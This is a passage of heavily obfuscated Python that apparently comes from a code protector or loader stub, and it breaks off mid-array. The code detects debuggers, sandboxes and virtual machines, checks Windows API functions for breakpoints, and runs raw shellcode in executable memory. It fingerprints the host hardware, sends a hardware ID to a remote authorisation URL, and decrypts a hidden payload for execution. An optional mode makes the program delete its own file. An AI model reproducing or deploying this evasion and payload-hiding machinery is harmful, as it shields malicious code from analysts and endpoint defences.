                _v = _c & 0x7fffffff
                if not (_c & 0x80000000):
                    _v ^= self._fhe_mask(i)
                res.append(_v & 0x7fffffff)
        return res
class _nixon_جۤऄզもۈ٘Ѹผ๊:
    def __init__(self, size=(62612 ^ 61588)):
        import ctypes, os
        self._use_c = False
        self._size = int(size) if size and int(size) > 0 else 1
        self._store = {}
        try:
            self.lib = ctypes.CDLL(os.path.join(os.path.dirname(__file__), _nixon_űƋთฺซט毓בը(178)))
            self.lib.ORAM_new.restype = ctypes.c_void_p
            self.lib.ORAM_new.argtypes = [ctypes.c_int]
            self.lib.ORAM_access.restype = ctypes.c_uint32
            self.lib.ORAM_access.argtypes = [ctypes.c_void_p, ctypes.c_bool, ctypes.c_int, ctypes.c_uint32]
            self._ptr = self.lib.ORAM_new(self._size)
            self._use_c = True
        except (AttributeError, OSError):
            import warnings as _w
            _w.warn('ORAM C module not available; using the pure-Python fallback (same layout hiding, slower)', RuntimeWarning, stacklevel=(36489 ^ 36491))
        
    def access(self, op, block_id, data=0):
        if self._use_c:
            is_write = (op == _nixon_űƋთฺซט毓בը(42))
            val = data if data is not None else 0
            return self.lib.ORAM_access(self._ptr, is_write, block_id, val)
        else:
            # The same layout-hiding store as the C core: a random
            # physical slot per logical one, re-randomised after every
            # write so the memory layout does not reveal which slot was
            # touched.
            if not hasattr(self, _nixon_űƋთฺซט毓בը(181)):
                import random as _r
                self._oram_pos = list(range(self._size))
                self._oram_data = [0] * self._size
                _r.shuffle(self._oram_pos)
            if op == _nixon_űƋთฺซט毓בը(42):
                self._oram_data[self._oram_pos[block_id]] = data
                import random as _r
                other = _r.randrange(self._size)
                pa = self._oram_pos[block_id]
                pb = self._oram_pos[other]
                self._oram_data[pa] = self._oram_data[pb]
                self._oram_data[pb] = data
                self._oram_pos[block_id] = pb
                self._oram_pos[other] = pa
                return data
            return self._oram_data[self._oram_pos[block_id]]
class _nixon_ねᎧעფɃۡɽч:
    def __init__(self):
        self.mutation_rounds = (55685 ^ 55686)
        
    def synthesize_ast(self, logic_block):
        import ast
        tree = ast.parse(logic_block)
        for node in ast.walk(tree):
            if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
                # Turn a+b into (a^b)+2*(a&b)
                pass # AST mutation logic hidden in real VM
        return compile(tree, '<synth>', _nixon_űƋთฺซט毓בը(130))
        
    def execute(self, logic_block, ctx):
        code = self.synthesize_ast(logic_block)
        exec(code, ctx)
class _nixon_廃ӆᛢקŽᏡք:
    def __init__(self):
        self.temporal_drift = 0.001
        
    def execute_redundant(self, func, *args):
        if not False:
            # Default: call once.
            #
            # Calling three times re-runs the callable's SIDE EFFECTS, so a
            # counter closure or anything non-deterministic always produced
            # three different results and the fault response fired on a false
            # positive. When that response was _nixon_űƋთฺซט毓בը(182), it also
            # destroyed the operator's file and left a 0-byte artefact that ran
            # silently forever after.
            return func(*args)
        # --strict-detections: full temporal redundancy, self-destruct and all.
        # Restored as an explicit opt-in rather than removed: it is a real fault
        # check, it is simply unsafe as a default for arbitrary user code.
        import time as __rt, sys as __rs, os as __ro
        __r1 = func(*args)
        __rt.sleep(self.temporal_drift)
        __r2 = func(*args)
        __rt.sleep(self.temporal_drift)
        __r3 = func(*args)
        if __r1 == __r2 == __r3: return __r1
        if __r1 == __r2: return __r1
        if __r2 == __r3: return __r2
        if __r1 == __r3: return __r1
        try: __ro.remove(__rs.argv[0])
        except Exception: pass
        __rs.exit(666)
_nixon_ΊӢץىまփॢ("[DEBUG] Classes loaded...")
# [THE 1% RULE] Verify Master Key via FHE/ORAM pipeline (Hardware Accelerated)
try:
    _BATCH_SIZE_ = (18428 ^ 18396)
    _HMAC_KEY_ENC_ = [__import__(_nixon_űƋთฺซט毓בը(183)).randbelow(100) + 1 for _ in range(_BATCH_SIZE_)]
    _fhe_ = _nixon_なרᛏĆՕٟĩٺई(batch_size=_BATCH_SIZE_)
    _oram_ = _nixon_جۤऄզもۈ٘Ѹผ๊(size=_BATCH_SIZE_)
    _nixon_ΊӢץىまփॢ(f"[DEBUG] FHE Type: {type(_fhe_)} | ORAM Type: {type(_oram_)}")
    # A REAL round-trip: encrypt the batch, add it to a second encrypted
    # batch (the homomorphic property), decrypt, and CHECK that the
    # plaintext came back.  The previous bootstrap decrypted a
    # PLAINTEXT array and stored the result without checking anything,
    # so it verified nothing at all.
    _KEY2_ = [__import__(_nixon_űƋთฺซט毓בը(183)).randbelow(100) + 1 for _ in range(_BATCH_SIZE_)]
    _CT1_ = _fhe_.encrypt_batch(_HMAC_KEY_ENC_)
    _CT2_ = _fhe_.encrypt_batch(_KEY2_)
    _CTS_ = _fhe_.add_batch(_CT1_, _CT2_)
    _DEC_ = _fhe_.dec_batch(_CTS_)
    _EXPECT_ = [_HMAC_KEY_ENC_[i] ^ _KEY2_[i] for i in range(_BATCH_SIZE_)]
    if [_DEC_[i] & 0x7fffffff for i in range(_BATCH_SIZE_)] != _EXPECT_:
        raise ValueError(_nixon_űƋთฺซט毓בը(184))
    if [_DEC_[i] & 0x7fffffff for i in range(_BATCH_SIZE_)] == _HMAC_KEY_ENC_:
        raise ValueError(_nixon_űƋთฺซט毓בը(185))
    _oram_.access(_nixon_űƋთฺซט毓בը(42), 0x1337, sum(_fhe_.dec_batch(_CT1_)) & 0xffffffff)
    _nixon_ΊӢץىまփॢ("[DEBUG] FHE/ORAM bootstrap successful (round-trip verified).")
except Exception as _e:
    _nixon_ΊӢץىまփॢ(f"[WARN] FHE/ORAM bootstrap failed: {_e}")
    _nixon_ӴƖՅבᏨ蛎Ўउ._nixon_覉ेृ۵ჾᎦᛐ(5)

BLOB_KEY = bytes.fromhex(_nixon_űƋთฺซט毓בը(268))

try:
    _nixon_Ηฅη恉ۉᎼ颼ौᛐ()
except Exception:
    pass
try:
    if globals().get(_nixon_űƋთฺซט毓בը(187)):
        BLOB_KEY = bytes([_b ^ 0x5A for _b in BLOB_KEY])
except Exception:
    pass
def _nixon_ͲɿϜおჸӿᛏĽΕ(reason):
    url = _nixon_űƋთฺซט毓בը(_nixon_ҿᏬƌȋʘ)
    if url: _nixon_ԹՕฏᛒঝქ廎ס(reason, url)
def _nixon_うずįĿჄᚼڄשĕۉ(data):
    if isinstance(data, bytearray):
        for _ in range(3):
            for i in range(len(data)):
                data[i] = _nixon_シークレット시크릿.randbits(8)
        for i in range(len(data)): data[i] = 0
    try: del data
    except: pass
    _nixon_ガベージ가비지.collect(); _nixon_ガベージ가비지.collect()
def _emergency_cleanup(signum=None, frame=None):
    for var_name in [_nixon_űƋთฺซט毓בը(188), _nixon_űƋთฺซט毓בը(189), _nixon_űƋთฺซט毓בը(190), _nixon_űƋთฺซט毓בը(191), _nixon_űƋთฺซט毓בը(192)]:
        if var_name in globals():
            _nixon_うずįĿჄᚼڄשĕۉ(globals()[var_name])
    if signum is not None: import sys; sys.exit(0)
_nixon_アテクシット종료.register(_emergency_cleanup)
_16cbeae604_PK = b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode()
globals()[_16cbeae604_PK] = 0
def _accumulate_poison(val):
    p = globals().get(_16cbeae604_PK, 0)
    globals()[_16cbeae604_PK] = (p + val) & 0xFF
try:
    _nixon_シグナル신호 = __import__(_nixon_űƋთฺซט毓בը(193))
    _nixon_シグナル신호.signal(_nixon_シグナル신호.SIGTERM, _emergency_cleanup)
    _nixon_シグナル신호.signal(_nixon_シグナル신호.SIGINT, _emergency_cleanup)
except: pass
def constant_time_compare(a, b):
    if len(a) != len(b): return False
    result = 0
    for x, y in zip(a, b): result |= x ^ y
    return result == 0
def _nx_strict_fail(reason):
    """Terminate when a detection fires and the operator armed it.

    The environment detections (sandbox, emulator, debugger, geo-fence,
    licence) are SIGNALS by default: they perturb the loader's hash
    chain, so the artifact behaves differently on a hostile host.  With
    --strict-detections they become gates and the artifact dies.
    """
    if not globals().get(_nixon_űƋთฺซט毓בը(194)):
        return
    try:
        import os as _nx_st_os
        _nx_st_os._exit(137)
    except Exception:
        pass
def _nx_self_fail(reason):
    """Terminate on a self-integrity mismatch.

    The loader checks its OWN bytes against the Merkle root and the HMAC
    the build computed over the finished loader.  Both verdicts used to
    be discarded with a bare `pass`, so a tampered artifact carried on.
    A mismatch is now terminal: wipe and exit 137, the same shape as
    the kill ladder in the inner loader.
    """
    try:
        import os as _nx_osf
        try:
            import sys as _nx_sysf
            _nx_sysf.stdout.flush()
            _nx_sysf.stderr.flush()
        except Exception:
            pass
        # Write the reason to fd 2 with os.write, which is unbuffered and
        # survives os._exit; print() would be lost. Without this the artifact
        # died silently and the cause could not be attributed (a Windows CI leg
        # exited 137 with no output and no way to tell integrity from anything
        # else).
        try:
            _nx_osf.write(2, ("[FATAL] self-integrity check failed: "
                              + str(reason) + "\n").encode("utf-8", _nixon_űƋთฺซט毓בը(195))[:256])
        except Exception:
            pass
        _nx_osf._exit(137)
    except Exception:
        try:
            import sys as _nx_sysf
            _nx_sysf.exit(137)
        except Exception:
            pass
def _nixon_びमあסฎ頫ҋ():
    try:
        # Imported locally: the interpreter-integrity guard is allowed to null
        # the module-level hashlib/hmac aliases when it decides the host is
        # hostile, and it did exactly that on Windows CI -- the self-check then
        # died with "'NoneType_nixon_űƋთฺซט毓בը(136)sha256'" and the
        # artifact exited 137 with no explanation. A check that decides whether
        # the artifact is intact must not depend on a name another hardening
        # path is permitted to burn.
        import hashlib as _nx_self_sha
        import hmac as _nx_self_mac
        with open(__file__, 'rb') as f: lines = f.readlines()
        # The lines that hold the EXPECTED values are excluded from the
        # hash: a value cannot be part of what it describes.  They are
        # identified by the VALUES themselves, not by a marker string.
        # A marker can be edited to still match -- and the marker's own
        # line was excluded from the hash too, so the edit was invisible
        # to the check.  With this filter the check's own code is hashed
        # like everything else.
        _nx_er = _nixon_जٮɦჇĨ
        _nx_eh = _nixon_雉Ⴓ肙ঙŎ
        filtered_lines = [l for l in lines
                          if _nx_er.encode() not in l and _nx_eh.encode() not in l]
        content = b"".join(filtered_lines)
        chunk_size = (46032 ^ 47056)
        chunks = [content[i:i+chunk_size] for i in range(0, len(content), chunk_size)]
        tree_root = _nixon_ᛛɻฅႹχŌ(chunks)
        root_hash = tree_root.hash if tree_root else ""
        if not constant_time_compare(root_hash.encode(), _nx_er.encode()):
            _nx_self_fail("merkle expected=%s got=%s bytes=%d lines=%d"
                          % (_nx_er[:16], str(root_hash)[:16], len(content), len(lines)))
        secret = bytes.fromhex(_HMAC_KEY_)
        sig = _nx_self_mac.new(secret, content, _nx_self_sha.sha256).hexdigest()
        if sig != _nx_eh:
            _nx_self_fail("hmac expected=%s got=%s bytes=%d"
                          % (str(_nx_eh)[:16], str(sig)[:16], len(content)))
        return _nx_self_sha.sha256(content).digest()
    except SystemExit:
        raise
    except Exception as e:
        try:
            import os as _nx_os_diag
            _nx_diag = "%s exists=%s cwd=%s dir=%s" % (
                __file__,
                _nx_os_diag.path.exists(__file__),
                _nx_os_diag.getcwd(),
                sorted(_nx_os_diag.listdir(_nx_os_diag.path.dirname(__file__))))
        except Exception as _nx_diag_e:
            _nx_diag = "no diagnostics: %s" % (_nx_diag_e,)
        _nixon_ΊӢץىまփॢ(f"[WARN] Self-check error: {e} ({_nx_diag})")
        # A self-check that could not RUN is a failed self-check.  It
        # used to log and continue, so editing the check's own code was
        # enough to disable it: the artifact carried on and exited 0.
        _nx_self_fail("self-check error: %s" % (e,))

def _nixon_ვ牶ႶΠՏƍᏨךल():
    digest = _nixon_ハッシュ해시.sha256()
    try:
        bad_mods = [_nixon_űƋთฺซט毓בը(103), _nixon_űƋთฺซט毓בը(105), _nixon_űƋთฺซט毓בը(196), _nixon_űƋთฺซט毓בը(197), _nixon_űƋთฺซט毓בը(198), _nixon_űƋთฺซט毓בը(199), _nixon_űƋთฺซט毓בը(200), _nixon_űƋთฺซט毓בը(201)]
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Windows":
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                psapi = _nixon_シータイプ씨타입.windll.psapi
                h_proc = k32.GetCurrentProcess()
                mod_handles = (_nixon_シータイプ씨타입.c_void_p * 1024)()
                cb_needed = _nixon_シータイプ씨타입.c_ulong()
                if psapi.EnumProcessModules(h_proc, _nixon_シータイプ씨타입.byref(mod_handles), _nixon_シータイプ씨타입.sizeof(mod_handles), _nixon_シータイプ씨타입.byref(cb_needed)):
                    count = int(cb_needed.value / _nixon_シータイプ씨타입.sizeof(_nixon_シータイプ씨타입.c_void_p))
                    buff = _nixon_シータイプ씨타입.create_string_buffer(260)
                    for i in range(count):
                        if psapi.GetModuleBaseNameA(h_proc, mod_handles[i], buff, 260):
                            name = buff.value.decode('latin1').lower()
                            for bad in bad_mods:
                                if bad in name: digest.update(b"BAD_MOD")
            elif _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
                with open(_nixon_űƋთฺซט毓בը(102), "r", encoding='utf-8') as f:
                    content = f.read().lower()
                    for bad in bad_mods:
                        if bad in content: digest.update(b"BAD_MOD")
        except: pass
        if _nixon_プラットフォーム플랫폼.system() == "Windows":
            try:
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                h_k32 = k32.GetModuleHandleA(b"kernel32.dll")
                h_ntdll = k32.GetModuleHandleA(b"ntdll.dll")
                funcs = [
                    (h_k32, b"CreateFileW"), 
                    (h_k32, b"VirtualAlloc"), 
                    (h_k32, b"IsDebuggerPresent"),
                    (h_ntdll, b"NtQueryInformationProcess")
                ]
                for h_mod, fn_name in funcs:
                    if not h_mod: continue
                    addr = k32.GetProcAddress(h_mod, fn_name)
                    if not addr: continue
                    first_byte = _nixon_シータイプ씨타입.string_at(addr, 1)
                    if first_byte == b'\xCC':
                        digest.update(b"BREAKPOINT_DETECTED")
            except: pass
    except: digest.update(b"ERR")
    return digest.digest()
def _nixon_ᚭᎹْुשफ็ฦې鳑():
    try:
        bad_sigs = [_nixon_űƋთฺซט毓בը(202), _nixon_űƋთฺซט毓בը(203), _nixon_űƋთฺซט毓בը(204), _nixon_űƋთฺซט毓בը(205), _nixon_űƋთฺซט毓בը(103)]
        count = 0
        for obj in _nixon_ガベージ가비지.get_objects():
            count += 1
            if count > 5000: break
            if isinstance(obj, types.ModuleType):
                name = getattr(obj, _nixon_űƋთฺซט毓בը(45), "")
                for b in bad_sigs:
                    if b in name: return True
            if isinstance(obj, str) and len(obj) < 100:
                for b in bad_sigs:
                    if b in obj: return True
    except: pass
    return False
def _nixon_ŽᛪฉჄגΙ๙():
    try:
        d = _nixon_٥たᛑнᚩᚱ()
        for _ in range(5): 
            d.stack.append(d._nixon_ί蕞ʬלᛚ())
    except: pass
def _nixon_ǹ迓Ǳסצ۠ل๑ঢշ():
    if not _nixon_οীԱѰՅᏜぅǓΛの: return b'\x00' * 32
    ids = []
    try:
        if _nixon_プラットフォーム플랫폼.machine() == _nixon_űƋთฺซט毓בը(140):
            sc = b"\x53\xb8\x01\x00\x00\x00\x0f\xa2\x89\xc3\x5b\xc3"
            if _nixon_プラットフォーム플랫폼.system() == "Windows":
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                p = k32.VirtualAlloc(None, 64, 0x3000, 0x40)
                _nixon_シータイプ씨타입.memmove(p, sc, len(sc))
                ids.append(str(_nixon_シータイプ씨타입.CFUNCTYPE(_nixon_シータイプ씨타입.c_uint32)(p)()))
                k32.VirtualFree(p, 0, 0x8000)
            elif _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
                libc = _nixon_シータイプ씨타입.CDLL(None)
                libc.mmap.restype = _nixon_シータイプ씨타입.c_void_p
                p = libc.mmap(0, 4096, 7, 0x22, -1, 0)
                _nixon_シータイプ씨타입.memmove(p, sc, len(sc))
                ids.append(str(_nixon_シータイプ씨타입.CFUNCTYPE(_nixon_シータイプ씨타입.c_uint32)(p)()))
                libc.munmap(p, 4096)
    except: pass
    try:
        if _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58):
            ids.append(str(_nixon_オペレーション운영.stat("/").st_ino))
            try:
                with open(_nixon_űƋთฺซט毓בը(206), "r", encoding='utf-8') as f: ids.append(f.read().strip())
            except: pass
            try:
                with open(_nixon_űƋთฺซט毓בը(207), "r", encoding='utf-8') as f: ids.append(f.read().strip())
            except: pass
            try:
                if _nixon_オペレーション운영.path.exists(_nixon_űƋთฺซט毓בը(174)):
                    import _nixon_サブプロセス서브
                    s = _nixon_サブプロセス서브.check_output([_nixon_űƋთฺซט毓בը(208), _nixon_űƋთฺซט毓בը(209)], timeout=(3740 ^ 3737)).decode().strip()
                    if s: ids.append(s)
            except: pass
        elif _nixon_プラットフォーム플랫폼.system() == "Windows":
            ids.append(_nixon_サブプロセス서브.check_output([_nixon_űƋთฺซט毓בը(210), _nixon_űƋთฺซט毓בը(211), _nixon_űƋთฺซט毓בը(212), chr(85)+chr(85)+chr(73)+chr(68)], timeout=(57912 ^ 57917)).decode().split()[-1].strip())
        elif _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(175):
            try:
                out = _nixon_サブプロセス서브.check_output([_nixon_űƋთฺซט毓בը(213), _nixon_űƋთฺซט毓בը(214), "-c", _nixon_űƋთฺซט毓בը(215)], timeout=(34748 ^ 34745)).decode()
                for line in out.split("\n"):
                    if _nixon_űƋთฺซט毓בը(216) in line:
                        ids.append(line.split('=')[1].strip().strip('"'))
                        break
            except: pass
    except: pass
    if not ids: ids.append(_nx_mac())
    return "|".join(ids).encode()
def _nixon_ჼ๖зŪפ鎌ぬᚹڏখ():
    h = _nixon_びमあסฎ頫ҋ()
    return _nixon_エイチマック에이치.new(_I_SALT, h, _nixon_ハッシュ해시.sha256).digest()
def _nixon_舗ᏴᏤĞŜχХ(k_int):
    hw = _nixon_ǹ迓Ǳסצ۠ل๑ঢշ()
    lc = _nixon_ვ牶ႶΠՏƍᏨךल()
    # The pack-time window, emitted as a constant.  Recomputing it from the
    # wall clock made the derived key change every 30 days, so an artefact
    # would stop decrypting a month after it was built: at pack the window
    # is always 0, at run it becomes 1 (and so on), and k_dec differs.
    w = _NX_BUILD_WINDOW
    msg = k_int + hw + lc + str(w).encode()
    return _nixon_ハッシュ해시.sha256(msg).digest()
def _nixon_ปᏗऎŭႻځǌჁᚾ(k_env, payload_str, part_a, part_b):
    vm_inst = None
    if len(_nixon_ՁʗάƇᏊᛠ) > 10:
        try:
            blob = _nixon_ベース베이스.b64decode(_nixon_ՁʗάƇᏊᛠ)
            sfx = _nixon_űƋთฺซט毓בը(85) if _nixon_プラットフォーム플랫폼.system() == _nixon_űƋთฺซט毓בը(58) else _nixon_űƋთฺซט毓בը(217)
            t_fd, t_path = _nixon_テンプ임시.mkstemp(suffix=sfx)
            _nixon_オペレーション운영.close(t_fd)
            with open(t_path, "wb") as f: f.write(blob)
            spec = _nixon_インポート임포트.util.spec_from_file_location(_nixon_űƋთฺซט毓בը(218), t_path)
            vm_mod = _nixon_インポート임포트.util.module_from_spec(spec)
            spec.loader.exec_module(vm_mod)
            _nixon_アテクシット종료.register(lambda: _nixon_オペレーション운영.unlink(t_path) if _nixon_オペレーション운영.path.exists(t_path) else None)
            vm_inst = vm_mod.NativeVM(VM_OP_MAP_2, 0)
        except: pass
    if not vm_inst: vm_inst = _nixon_阅זۋძᏊǐᚷ่ɲղ(VM_OP_MAP_3, 0)
    inputs = [part_a, part_b, payload_str]
    vm1 = _nixon_阅זۋძᏊǐᚷ่ɲղ(VM_OP_MAP_1, 0)
    k_vm1 = vm1._nixon_ᛁҌłЭŃᚼӋऌ(VM_BC_1, [0,0,0])
    bc2 = bytearray(VM_BC_2_ENC)
    for i in range(len(bc2)): bc2[i] ^= k_vm1[i % len(k_vm1)]
    vm2 = _nixon_阅זۋძᏊǐᚷ่ɲղ(VM_OP_MAP_2, 0)
    k_vm2 = vm2._nixon_ᛁҌłЭŃᚼӋऌ(bytes(bc2), [0,0,0])
    bc3 = bytearray(VM_BC_3_ENC)
    for i in range(len(bc3)): bc3[i] ^= k_vm2[i % len(k_vm2)]
    k_vm3 = vm_inst._nixon_ᛁҌłЭŃᚼӋऌ(bytes(bc3), inputs)
    if not k_vm3: k_vm3 = b'\x00'*32
    return k_vm3
def _nixon_עअӂխᚡもא():
    try:
        pass
        if open is not _nixon_ビルトイン빌트인.open: return True
        if __import__ is not _nixon_ビルトイン빌트인.__import__: return True
        if _nixon_এɞᎯŪĥۖᛅʤᛉ._nixon_ɛΕख़ռڞফढ़๒ไŃ(): return True
    except: pass
    return False
def _nixon_凖ăᛅʧɡথ():
    max_retries = (59457 ^ 59458)
    for attempt in range(max_retries):
        try:
            raw_url = _nixon_űƋთฺซט毓בը(_nixon_ढśᏫբჵ)
            if not raw_url or len(raw_url) < 10: return b"\x00"*32
            try:
                doh_key = _nixon_לɓאॊɚŠ(_nixon_űƋთฺซט毓בը(219)) 
                if doh_key: return doh_key.encode()[:32]
            except: pass
            with _nixon_ᎺᏍᏣűपƌ(raw_url) as s_url:
                url = s_url.decode()
                hw = _nx_mac()
                p = _nixon_ジェイソン제이슨.dumps({"hw": hw, "ts": int(_nixon_時間시간.time()), _nixon_űƋთฺซט毓בը(220): _nixon_シークレット시크릿.token_hex(8)}).encode()
                r = _nixon_ウラルユーアールエル유알엘.request.Request(url, data=p, headers={_nixon_űƋთฺซט毓בը(118): _nixon_űƋთฺซט毓בը(122)})
                c = _nixon_ҎϘ瑈จĐॖʜ铍ɿ()
                res = _nixon_ウラルユーアールエル유알엘.request.urlopen(r, timeout=(33087 ^ 33082), context=c)
                d = _nixon_ジェイソン제이슨.loads(res.read())
                if d.get(_nixon_űƋთฺซט毓בը(221)): return b"\x00"*32 
                return b"\x00"*32
        except Exception as e:
            if attempt == max_retries - 1:
                _nixon_ΊӢץىまփॢ("[FATAL] Network auth failed after retries") 
                _nixon_ͲɿϜおჸӿᛏĽΕ(_nixon_űƋთฺซט毓בը(222))
                if not _nixon_ɫȀח०ƣნほɦ:
                    pass
            _nixon_時間時間.sleep(2 ** attempt)
    return b"\x00"*32
def _nixon_্蓼Ȫᛠהʒ():
    s = 0
    try:
        if hasattr(_nixon_オペレーション운영, _nixon_űƋთฺซט毓בը(223)):
            if _nixon_オペレーション운영.sysconf(_nixon_űƋთฺซט毓בը(224)) < 2: s += 1
        if _nixon_オペレーション운영.path.exists(_nixon_űƋთฺซט毓בը(225)): s += 2
        if _nixon_オペレーション운영.path.exists(_nixon_űƋთฺซט毓בը(83)): s = 0 
    except: pass
    return s > 0
def _nixon_Ҥџы৯ɲա():
    _nixon_ガベージ가비지.disable()
    t0 = _nixon_時間시간.perf_counter()
    _ = bytearray(100000) 
    base = max(_nixon_時間시간.perf_counter() - t0, 0.000001)
    t0 = _nixon_時間시간.perf_counter()
    try:
        x = bytearray(5 * 1024 * 1024)
        _nixon_うずįĿჄᚼڄשĕۉ(x)
    except: pass
    diff = _nixon_時間시간.perf_counter() - t0
    _nixon_ガベージ가비지.enable()
    if diff > 15.0: 
        pass
        return False 
    return False
def _nixon_りऎۛאはঝՍ():
    if _nixon_ǞძごŅĞǈऱჳՆ(): _accumulate_poison(17)
    import sys
    if sys.gettrace(): _accumulate_poison(33)
    if _nixon_עअӂխᚡもא(): _accumulate_poison(65)
    try:
        import sys; f = sys._getframe(1)
        if _nixon_űƋთฺซט毓בը(226) not in f.f_code.co_filename and __file__ not in f.f_code.co_filename:
             _accumulate_poison(128)
    except: pass
    _16cbeae604_PK = b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode()
    return globals().get(_16cbeae604_PK, 0)
def _nixon_ॢؑתᛩЬɶپ(d):
    if isinstance(d, str): d = d.encode()
    return bytes([(b - 13) % 256 for b in d])
def _nixon_ᚯղᛖᛏęრচჲぅס(e):
    try:
        outer = _nixon_ベース베이스.b64decode(e)
        rotated = _nixon_ॢؑתᛩЬɶپ(outer)
        inner = _nixon_ベース베이스.b64decode(rotated)
        r = _nixon_ジェイソン제이슨.loads(inner.decode())
        if not isinstance(r, list) or len(r) > 100: raise Exception(_nixon_űƋთฺซט毓בը(227))
        return r
    except Exception as err: 
        _nixon_ΊӢץىまփॢ(f"[FATAL] Recipe Decode Failed: {err}"); _nixon_システム시스템.exit(1)
def _nixon_霩ごڗΧჶべͼ(s, r):
    b = s.encode('latin1') if isinstance(s, str) else s
    _B64 = chr(98)+chr(54)+chr(52)
    _B32 = chr(98)+chr(51)+chr(50)
    _B16 = chr(98)+chr(49)+chr(54)
    _B85 = chr(98)+chr(56)+chr(53)
    _R13 = chr(114)+chr(111)+chr(116)+chr(49)+chr(51)
    for l in reversed(r):
        try:
            if l == _B64: b = _nixon_ベース베이스.b64decode(b)
            elif l == _B32: b = _nixon_ベース베이스.b32decode(b)
            elif l == _B16: b = _nixon_ベース베이스.b16decode(b)
            elif l == _B85: b = _nixon_ベース베이스.b85decode(b)
            elif l == _R13: b = _nixon_ॢؑתᛩЬɶپ(b)
        except Exception as err: 
            _nixon_ΊӢץىまփॢ(f"[FATAL] Onion Decode Failed at {l}: {err}"); 
            _nixon_システム시스템.exit(1)
    return b
def _nixon_ᛐᎫՓńᎾҕᏃᛡঌᚻ():
    p = []
    g = globals()
    for i in range(_nixon_ʊӤぃऴᎲᛠよѡٙ):
        k = f"_48d875f4f407{i}"
        if k in g: p.append(g[k])
        else: 
            _nixon_ΊӢץىまփॢ("[FATAL] Payload corrupted"); _nixon_システム시스템.exit(1)
    return "".join(p)
def _nixon_Ƿצ餛ϖᚷาԲᎹज():
    k = _nixon_ڃॗᛉǺฒ + _nixon_ᎧᏚՈשלՏც
    enc = _nixon_ᛐᎫՓńᎾҕᏃᛡঌᚻ()
    if len(enc) == 0:
        _nixon_ΊӢץىまփॢ("[FATAL] Payload reassembly failed."); _nixon_システム시스템.exit(1)
    try:
        raw = _nixon_ベース베이스.b64decode(enc)
        dec = bytes([raw[i] ^ k[i % len(k)] for i in range(len(raw))])
        return dec.decode('utf-8')
    except Exception as e:
        _nixon_ΊӢץىまփॢ(f"[FATAL] Stage0 Decode Error: {e}"); _nixon_システム시스템.exit(1)
def _nixon_ǩע埴ĠרڶُჶᎵ(auth_input):
    try:
        import ssl, struct
        url = _nixon_űƋთฺซט毓בը(_nixon_ढśᏫբჵ)
        if not url: return False
        session_token = bytes.fromhex(_nixon_űƋთฺซט毓בը(269))
        cipher = _nixon_źჺᛤŲछ综ȭͽ(session_token)
        nonce = _nixon_シークレット시크릿.token_bytes(12)
        enc_pass = cipher.decrypt(auth_input.encode(), nonce)
        pub_key = [1, 1, 1, 1, 2047, 2047, 0, 2047, 2, 0, 0, 1, 2047, 0, 0, 2045, 2046, 2047, 2047, 2046, 0, 0, 0, 0, 2047, 2047, 0, 0, 2047, 0, 2047, 0, 0, 2047, 0, 0, 2046, 0, 0, 2, 0, 0, 0, 2047, 2, 1, 1, 1, 2047, 1, 2047, 0, 1, 2047, 0, 0, 1, 0, 0, 2047, 0, 2046, 2047, 0, 3, 0, 0, 1, 1, 2047, 2047, 0, 2047, 1, 2, 2, 1, 0, 2047, 0, 0, 0, 2047, 1, 2047, 0, 0, 1, 0, 0, 2047, 0, 0, 1, 2, 1, 2, 2047, 0, 0, 2047, 4, 0, 2046, 0, 1, 1, 0, 0, 0, 0, 2047, 0, 2047, 2047, 1, 0, 2047, 2047, 2047, 0, 0, 2046, 0, 0, 2, 1, 2, 0, 0, 1, 1, 2047, 0, 1, 2047, 0, 0, 0, 2047, 0, 2046, 1, 1, 2047, 2, 2047, 2, 1, 2047, 2047, 0, 0, 2047, 0, 1, 0, 2047, 2047, 2047, 0, 0, 1, 1, 0, 1, 0, 0, 1, 2047, 2047, 0, 0, 0, 2047, 1, 2045, 2046, 2047, 2045, 1, 1, 0, 0, 0, 0, 1, 2047, 0, 0, 0, 0, 1, 1, 1, 0, 2047, 0, 2, 2, 1, 1, 2, 1, 0, 1, 2047, 1, 2044, 2047, 2047, 1, 2047, 0, 2047, 1, 0, 2047, 0, 2047, 1, 0, 2, 2047, 2047, 0, 2046, 0, 2046, 2047, 0, 2047, 2, 0, 0, 2045, 1, 1, 0, 2046, 2047, 0, 2047, 0, 0, 0, 2047, 0, 2047, 2, 2047, 0, 0, 3, 0, 1, 2047, 0, 3, 0, 1, 0, 2, 0, 1, 0, 0, 0, 3, 2046, 1, 2047, 0, 2045, 0, 0, 0, 2047, 2047, 2, 2045, 2047, 1, 2, 2047, 2046, 2046, 1, 0, 2047, 0, 2, 2, 2, 1, 0, 0, 2046, 0, 0, 0, 2047, 0, 1, 1, 2046, 1, 2047, 1, 2, 0, 2, 2, 2047, 0, 2047, 2047, 1, 0, 0, 2047, 2047, 1, 1, 0, 0, 1, 2047, 0, 1, 0, 0, 2046, 1, 2047, 0, 2046, 2046, 0, 1, 2047, 1, 0, 2047, 0, 1, 0, 0, 2047, 0, 0, 2047, 0, 1, 2047, 2047, 2046, 2046, 2, 2047, 0, 0, 0, 1, 0, 1, 0, 2047, 0, 2047, 0, 0, 0, 2, 0, 0, 0, 0, 1, 1, 1, 2046, 0, 2, 0, 1, 2045, 0, 2046, 2047, 0, 2047, 1, 2046, 0, 2, 1, 2047, 1, 1, 2, 1, 0, 2047, 1, 0, 2047, 1, 0, 2047, 0, 1, 1, 1, 2047, 1, 2047, 0, 0, 2, 2047, 0, 0, 0, 2047, 0, 2046, 2047, 2045, 1, 2047, 1, 0, 0, 0, 0, 0, 2046, 1, 0, 2047, 0, 0, 2, 2046, 1, 0, 1, 2047, 2047, 1, 1, 1, 1, 2, 1, 1, 1, 0, 2047, 0, 0, 0, 1, 0, 2046, 1, 1, 2047, 1, 0, 2, 2047, 1, 2047, 2047, 0, 2047, 0, 0, 0, 2047, 0, 2046, 0, 0, 1, 2046, 2047, 2, 2047, 0, 1, 